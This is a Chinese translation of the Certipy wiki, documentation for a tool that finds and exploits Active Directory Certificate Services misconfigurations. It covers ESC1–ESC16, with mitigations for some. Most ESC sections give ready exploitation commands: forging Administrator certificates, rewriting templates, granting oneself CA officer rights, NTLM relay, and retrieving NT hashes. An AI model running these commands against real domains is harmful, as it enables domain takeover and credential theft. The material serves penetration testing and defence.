---
title: Certipy 中文文档
date: 2026-04-07 12:00:00
categories:
  - 工具wiki
tags:
  - 工具wiki
---
# Certipy 中文文档

> 翻译自: https://github.com/ly4k/Certipy/wiki

Certipy 是一个功能强大的攻击和防御工具包，用于枚举和滥用 Active Directory 证书服务 (AD CS)。它帮助红队人员、渗透测试人员和防御者评估 AD CS 配置错误——包括完全支持识别和利用所有已知的 ESC1-ESC16 攻击路径。

---

## 目录

1. [简介](#一简介)
2. [安装](#二安装)
3. [使用方法](#三使用方法)
4. [提权技术 (ESC1-ESC16)](#四提权技术-esc1-esc16)
5. [命令参考](#五命令参考)

---

## 一、简介

Active Directory 证书服务 (AD CS) 是 Microsoft 的本地公钥基础设施 (PKI) 解决方案，用于在 Active Directory 环境中颁发和管理数字证书。这些证书支持关键功能，如文件加密、数字签名和身份验证（例如智能卡登录或服务器的 TLS/SSL）。由于 AD CS 可以颁发等效于密码的凭据——允许作为用户或计算机访问的证书——因此受损的证书颁发机构 (CA) 或配置错误的证书模板可能与域控制器入侵具有同等影响。因此，AD CS 组件被视为 Tier-0 资产。

2021年，SpecterOps 发布了"Certified Pre-Owned"白皮书，揭示了多种可实现特权提升和域持久化的 AD CS 配置错误。这些被归类为 ESC1 到 ESC8（特权提升滥用案例）。此后，该列表已扩展到 ESC16，其他研究人员引入了新技术。这些 ESC 演示了 AD CS 中微妙的缺陷如何被滥用以获得提升的特权——通常可达到域管理员级别——或维持隐蔽访问。

### Certipy 功能特性

- 🔎 发现证书颁发机构和模板
- 🚩 识别配置错误
- 🔐 请求和伪造证书
- 🎭 使用证书执行身份验证
- 📡 将 NTLM 身份验证中继到 AD CS HTTP(S)/RPC 端点
- 🗝️ 支持 Shadow Credentials、Golden Certificates 和证书映射攻击
- 🧰 更多功能！

### 支持的 AD CS 漏洞

Certipy 支持检测和利用 ESC1-ESC16 全部范围的 AD CS 漏洞。

---

## 二、安装

Certipy 是一个 Python 工具，支持 Python 3.12+，可在 Linux 和 Windows 上运行。该工具通过 pip (Python Package Index) 以 `certipy-ad` 名称分发。

### Linux 安装 (Debian/Ubuntu/Kali)

```bash
# 1. 安装 Python 3.12+ 和 pip
sudo apt update && sudo apt install -y python3 python3-pip

# 2. 创建并激活虚拟环境（可选但推荐）
python3 -m venv certipy-venv
source certipy-venv/bin/activate

# 3. 通过 pip 安装 Certipy
pip install certipy-ad
```

**Kali Linux 注意事项：** Kali 在其软件包仓库中包含 Certipy，名称为 `certipy-ad`。它可能预装在最新的 Kali 版本上。如果是这样，您可以直接运行 `certipy-ad`（Kali 的打包命令名称）。

### Windows 安装 (PowerShell)

```powershell
# 1. 安装 Python 3.12+ for Windows

# 2. 创建虚拟环境（可选）
py -3.12 -m venv certipy-venv
certipy-venv\Scripts\Activate.ps1

# 3. 使用 pip 安装 Certipy
pip install certipy-ad

# 4. 验证安装
certipy -h
```

### 升级 Certipy

```bash
pip install -U certipy-ad
```

### 故障排除

- 始终使用 `certipy` 命令运行 Certipy（不是 `certipy-ad`），如果通过 pip 安装
- 如果在 Windows 上安装后出现 'certipy' is not recognized 错误，请确保 Python Scripts 目录在 PATH 中
- Certipy 依赖于多个库（impacket、cryptography、asn1crypto 等）。Pip 应该处理这些依赖

---

## 三、使用方法

Certipy 是一个具有模块化结构的命令行工具。基本调用方式：

```bash
certipy [全局选项] <命令> [命令选项]
```

### 主要子命令

| 命令 | 描述 |
|------|------|
| `find` | 枚举域中的 AD CS 配置。扫描 CA、证书模板和相关对象，突出显示潜在的配置错误或易受攻击的设置 |
| `req` | 从 CA 请求证书。允许主动尝试为给定模板进行注册 |
| `auth` | 使用证书进行身份验证。给定 PFX（证书 + 私钥），执行域身份验证（Kerberos PKINIT） |
| `relay` | 执行针对 AD CS HTTP(S) 或 RPC 端点的 NTLM 中继攻击（ESC8/ESC11） |
| `shadow` | 执行 Shadow Credentials 攻击（基于证书的持久化） |
| `forge` | 给定受损的 CA 伪造证书（Golden Certificate） |
| `ca` | 管理 CA 模板和请求 |
| `template` | 查看或修改证书模板配置 |
| `account` | 管理 AD 用户/计算机账户 |
| `cert` | 导入/导出/操作本地证书 |

### 使用示例

#### 1. 枚举 AD CS

```bash
certipy find \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -text \
    -enabled -hide-admins
```

**输出示例：**

```
Certificate Authorities
  0
    CA Name                             : CORP-CA
    DNS Name                            : CA.CORP.LOCAL
    ...
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
      ESC8                              : Web Enrollment is enabled over HTTPS and Channel Binding is disabled.

Certificate Templates
  0
    Template Name                       : UserTemplate
    Display Name                        : UserTemplate
    Certificate Authorities             : CORP-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    ...
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

#### 2. 请求证书（利用 ESC1）

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'UserTemplate' \
    -upn 'Administrator@corp.local' -sid 'S-1-5-21-...-500'
```

**输出示例：**

```
[*] Requesting certificate via RPC
[*] Request ID is 1
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Wrote certificate and private key to 'administrator.pfx'
```

#### 3. 使用证书进行身份验证

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

**输出示例：**

```
[*] Certificate identities:
    SAN UPN: 'Administrator@corp.local'
    Security Extension SID: 'S-1-5-21-...-500'
[*] Using principal: 'Administrator@corp.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Wrote credential cache to 'Administrator.ccache'
[*] Trying to retrieve NT hash for 'Administrator'
[*] Got hash for 'Administrator@corp.local':
    aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
```

---

## 四、提权技术 (ESC1-ESC16)

AD CS 中的配置错误可能允许低特权用户在 Active Directory 中提升特权，通常可达到域管理员级别。SpecterOps 研究引入了"ESC"编号来对这些 AD CS 滥用场景进行分类。这里我们介绍 ESC1 到 ESC16。

---

### ESC1: 注册者提供主题用于客户端身份验证

#### 描述

ESC1 是典型的 AD CS 配置错误，可直接导致特权提升。当证书模板安全设置不足时会出现此漏洞，允许低特权用户请求证书，并在证书的 SAN 中指定任意身份。这允许攻击者冒充任何用户，包括管理员。

**ESC1 漏洞条件：**

1. **注册者提供主题**：模板启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志
2. **身份验证 EKU**：模板包含允许身份验证的 EKU
   - Client Authentication (OID 1.3.6.1.5.5.7.3.2)
   - Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)
   - PKINIT Client Authentication (OID 1.3.6.1.5.2.3.4)
   - Any Purpose (OID 2.5.29.37.0)
3. **宽松的注册权限**：低特权用户或广泛组（如 Domain Users）被授予注册权限
4. **无有效安全门控**：模板不强制管理员批准，也不需要授权签名

#### 识别

```bash
certipy find -u 'user@corp.local' -p 'password' -dc-ip '10.0.0.100'
```

**关键指标：**
- `[!] Vulnerabilities ESC1 : Enrollee supplies subject and template allows client authentication`
- `Enrollee Supplies Subject : True`
- `Client Authentication : True`
- `[+] User Enrollable Principals` 显示攻击者所属的组

#### 利用

**步骤 1：请求目标用户证书**

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'VulnTemplate' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
```

**步骤 2：使用证书进行身份验证**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

#### 缓解措施

1. 禁用"注册者提供主题"选项
2. 限制注册权限仅授予特定用户或安全组
3. 实施管理员批准
4. 使用授权签名
5. 禁用未使用的模板

---

### ESC2: 任意用途证书模板

#### 描述

ESC2 漏洞源于配置了"任意用途" EKU 或没有指定 EKU 的证书模板。"任意用途" EKU 由 OID 2.5.29.37.0 标识。

**ESC2 漏洞条件：**

1. 模板包含"任意用途" EKU 或没有 EKU
2. 低特权用户被授予注册权限

由于"任意用途"隐式授予"证书请求代理"能力，攻击者可以使用其"任意用途"证书代表其他用户（可能是域管理员）请求另一个证书。

#### 利用

**步骤 1：获取任意用途证书**

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'AnyPurposeCert'
```

**步骤 2：代表目标用户请求证书**

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -on-behalf-of 'CORP\Administrator' \
    -pfx 'attacker.pfx'
```

---

### ESC3: 证书请求代理模板

#### 描述

ESC3 源于危险的扩展密钥用法 (EKU)。如果证书模板配置了 Certificate Request Agent (1.3.6.1.4.1.311.20.2.1) EKU，该证书可用于"代表"其他用户签名证书请求。

**滥用场景是两步过程：**

1. 请求并获取证书请求代理（注册代理）证书
2. 使用注册代理证书代表其他用户请求证书

#### 利用

**步骤 1：获取注册代理证书**

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'CustomEnrollmentAgent'
```

**步骤 2：代表目标用户请求证书**

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -on-behalf-of 'CORP\Administrator' \
    -pfx 'attacker.pfx'
```

---

### ESC4: 特权访问证书模板

#### 描述

ESC4 源于对证书模板对象本身的特权访问。如果攻击者对证书模板对象具有特权访问权限，则可以重新配置模板使其易受 ESC1 攻击。

**所需权限：**
- WriteOwner
- WriteDacl
- WriteProperty

#### 利用

**步骤 1：保存当前配置**

```bash
certipy template \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' \
    -template 'VulnTemplate' \
    -save-configuration 'VulnTemplate.json'
```

**步骤 2：应用易受攻击的配置**

```bash
certipy template \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' \
    -template 'VulnTemplate' \
    -write-default-configuration
```

**步骤 3：请求证书（ESC1 利用）**

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'VulnTemplate' \
    -upn 'administrator@corp.local'
```

**步骤 4：恢复原始配置**

```bash
certipy template \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' \
    -template 'VulnTemplate' \
    -write-configuration 'VulnTemplate.json'
```

---

### ESC5: 特权访问 PKI 对象

ESC5 源于对 PKI 对象的特权访问。如果攻击者对 PKI 对象具有特权访问权限，则可以重新配置对象以实现特权提升。

这可能包括：
- CA 对象
- 证书模板容器
- OID 容器
- 等

---

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 标志

#### 描述

ESC6 源于 CA 上的 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志。如果启用了此标志，则任何证书请求都可以包含任意主题备用名称 (SAN)，而不管模板配置如何。

#### 识别

```bash
certipy find -u 'user@corp.local' -p 'password' -dc-ip '10.0.0.100'
```

#### 利用

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -upn 'administrator@corp.local'
```

#### 缓解措施

禁用该标志：

```bash
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc & net start certsvc
```

---

### ESC7: 特权访问 CA

#### 描述

ESC7 源于对 CA 对象本身的特权访问。如果攻击者对 CA 对象具有特权访问权限，则可以重新配置 CA 以实现特权提升。

**CA 上的关键角色：**
- **ManageCA** - 允许管理 CA 配置
- **ManageCertificates** - 允许颁发/拒绝证书请求

#### 利用

**授予自己 ManageCertificates 角色：**

```bash
certipy ca \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' \
    -add-officer 'attacker'
```

**颁发待处理的证书请求：**

```bash
certipy ca \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' \
    -issue-request 1
```

---

### ESC8: NTLM 中继到 AD CS HTTP 端点

#### 描述

ESC8 源于启用了 NTLM 身份验证的 HTTP 端点。如果 CA 具有 HTTP 注册端点，则可以将 NTLM 身份验证中继到这些端点以获取证书。

**易受攻击的端点：**
- /certsrv/certfnsh.asp
- /certsrv/certenroll/

#### 利用

```bash
certipy relay -target 'http://CA.CORP.LOCAL' -ca 'CORP-CA'
```

---

### ESC9: 无安全扩展的证书

ESC9 源于证书模板配置中缺少安全扩展。如果证书模板未配置为包含请求用户的 SID，则证书可能被滥用于特权提升。

---

### ESC10: 弱证书映射

ESC10 源于弱证书映射。如果环境未配置为使用强证书映射，则证书可能被滥用于特权提升。

**两种变体：**
- **变体 1：** 用户账户的 userCertificate 属性用于映射
- **变体 2：** 用户账户的 altSecurityIdentities 属性用于映射

---

### ESC11: IF_ENFORCEENCRYPTICERTREQUEST 标志

#### 描述

ESC11 源于 CA 上的 `IF_ENFORCEENCRYPTICERTREQUEST` 标志未启用。如果未启用此标志，则可以通过 RPC 进行未加密的证书请求，容易受到中继攻击。

#### 缓解措施

启用该标志：

```bash
certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc & net start certsvc
```

---

### ESC12: PKINIT 缓存

ESC12 源于 PKINIT 缓存行为。如果用户使用证书进行 PKINIT 身份验证，则 Kerberos 服务票据会被缓存，可能被滥用于特权提升。

---

### ESC13: 链接到高特权组的颁发策略

#### 描述

ESC13 源于颁发策略链接到高特权组。如果证书模板配置了链接到高特权组的颁发策略，则请求该模板的证书可能导致特权提升。

#### 识别

```bash
certipy find -u 'user@corp.local' -p 'password' -dc-ip '10.0.0.100' -oids
```

---

### ESC14: altSecurityIdentities 滥用

ESC14 源于 altSecurityIdentities 属性的滥用。如果用户账户的 altSecurityIdentities 属性配置不当，则可能被滥用于特权提升。

---

### ESC15: 应用程序策略滥用 (CVE-2024-49019)

ESC15 是 AD CS 中的漏洞，源于应用程序策略的滥用。如果证书模板允许在证书请求中指定应用程序策略，则可能被滥用于特权提升。

---

### ESC16: 代理提供程序滥用

ESC16 源于代理提供程序的滥用。如果 CA 配置了代理提供程序，则可能被滥用于特权提升。

---

## 五、命令参考

### 全局选项

```bash
certipy -h
```

| 选项 | 描述 |
|------|------|
| `-v, --version` | 显示版本号 |
| `-h, --help` | 显示帮助信息 |
| `-debug, --debug` | 启用调试输出 |

### account - 管理账户

```bash
certipy account [create|read|update|delete] -user <SAMName> [options]
```

| 选项 | 描述 |
|------|------|
| `-user <SAMName>` | 账户的 SAM 账户名 |
| `-group <CN=Group,...>` | 要添加账户的组 |
| `-dns <hostname>` | 设置 DNS 主机名 |
| `-upn <user@domain>` | 设置用户主体名称 |
| `-sam <NewSAM>` | 设置新的 SAM 名称 |
| `-spns <SPN1,SPN2,...>` | 设置 SPN |
| `-pass <password>` | 设置密码 |

### auth - 使用证书认证

```bash
certipy auth -pfx <cert.pfx> [options]
```

| 选项 | 描述 |
|------|------|
| `-pfx <file>` | PFX/P12 证书文件路径 |
| `-password <password>` | PFX 密码 |
| `-no-save` | 不保存 Kerberos TGT |
| `-no-hash` | 不请求 NT 哈希 |
| `-print` | 以 Kirbi 格式打印 TGT |
| `-kirbi` | 保存为 .kirbi 格式 |
| `-ldap-shell` | 认证后启动 LDAP shell |

### ca - 管理 CA

```bash
certipy ca -ca <CAName> [options]
```

| 选项 | 描述 |
|------|------|
| `-list-templates` | 列出启用的模板 |
| `-enable-template <Template>` | 启用模板 |
| `-disable-template <Template>` | 禁用模板 |
| `-issue-request <ID>` | 颁发请求 |
| `-deny-request <ID>` | 拒绝请求 |
| `-add-officer <User>` | 添加 CA 管理员 |
| `-remove-officer <User>` | 移除 CA 管理员 |

### cert - 管理证书

```bash
certipy cert [options]
```

| 选项 | 描述 |
|------|------|
| `-pfx <infile>` | 从 PFX/P12 文件加载 |
| `-password <password>` | 输入 PFX 密码 |
| `-key <infile>` | 从 PEM/DER 文件加载私钥 |
| `-cert <infile>` | 从 PEM/DER 文件加载证书 |
| `-export` | 导出为 PFX/P12 |
| `-out <outfile>` | 输出文件名 |
| `-nocert` | 不在输出中包含证书 |
| `-nokey` | 不在输出中包含私钥 |

### find - 枚举 AD CS

```bash
certipy find [options]
```

| 选项 | 描述 |
|------|------|
| `-text` | 输出为格式化文本文件 |
| `-stdout` | 输出到控制台 |
| `-json` | 输出为 JSON |
| `-csv` | 输出为 CSV |
| `-output <prefix>` | 输出文件前缀 |
| `-enabled` | 仅显示启用的模板 |
| `-vulnerable` | 仅显示易受攻击的模板 |
| `-oids` | 显示颁发策略 OID |
| `-hide-admins` | 隐藏管理员权限 |

### forge - 伪造证书

```bash
certipy forge [options]
```

| 选项 | 描述 |
|------|------|
| `-ca-pfx <file>` | CA 证书/密钥用于签名 |
| `-ca-password <password>` | CA PFX 密码 |
| `-subject <DN>` | 证书主题 |
| `-upn <upn>` | SAN UPN |
| `-dns <dns>` | SAN DNS |
| `-sid <sid>` | SID 扩展 |
| `-template <file>` | 克隆另一个证书 |
| `-key-size <bits>` | 密钥大小 |
| `-validity-period <days>` | 有效期 |
| `-out <file>` | 输出文件 |

### relay - NTLM 中继

```bash
certipy relay -target <proto://host> [options]
```

| 选项 | 描述 |
|------|------|
| `-target <proto://host>` | 目标 URL |
| `-ca <CAName>` | CA 名称 |
| `-template <Template>` | 证书模板 |
| `-out <file>` | 输出文件 |
| `-interface <IP>` | 绑定接口 |
| `-port <Port>` | 绑定端口 |
| `-forever` | 保持服务器运行 |

### req - 请求证书

```bash
certipy req -ca <CAName> -template <Template> [options]
```

| 选项 | 描述 |
|------|------|
| `-ca <CAName>` | CA 名称 |
| `-template <Template>` | 证书模板 |
| `-subject <DN>` | 请求主题 |
| `-upn <upn>` | SAN UPN |
| `-dns <dns>` | SAN DNS |
| `-sid <sid>` | SID 扩展 |
| `-on-behalf-of <DOMAIN\User>` | 代表其他用户请求 |
| `-pfx <file>` | 使用现有 PFX |
| `-renew` | 续订证书 |
| `-web` | 使用 HTTP 请求 |
| `-dcom` | 使用 DCOM 请求 |

### shadow - Shadow Credentials 攻击

```bash
certipy shadow <list|add|remove|clear|info|auto> [options]
```

| 选项 | 描述 |
|------|------|
| `-account <target>` | 目标账户 |
| `-device-id <GUID>` | 特定设备 ID |
| `-out <file>` | 保存证书/密钥 |

### template - 管理模板

```bash
certipy template -template <Name> [options]
```

| 选项 | 描述 |
|------|------|
| `-save-configuration <file>` | 保存当前配置 |
| `-write-configuration <file>` | 从文件应用配置 |
| `-write-default-configuration` | 应用 ESC1 易受攻击的默认配置 |
| `-no-save` | 跳过备份 |
| `-force` | 抑制确认提示 |

---

## 参考资源

- [Certipy GitHub 仓库](https://github.com/ly4k/Certipy)
- [Certified Pre-Owned 论文](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [SpecterOps AD CS 研究](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

---

*本文档翻译自 Certipy Wiki，仅供安全研究和授权测试使用。*

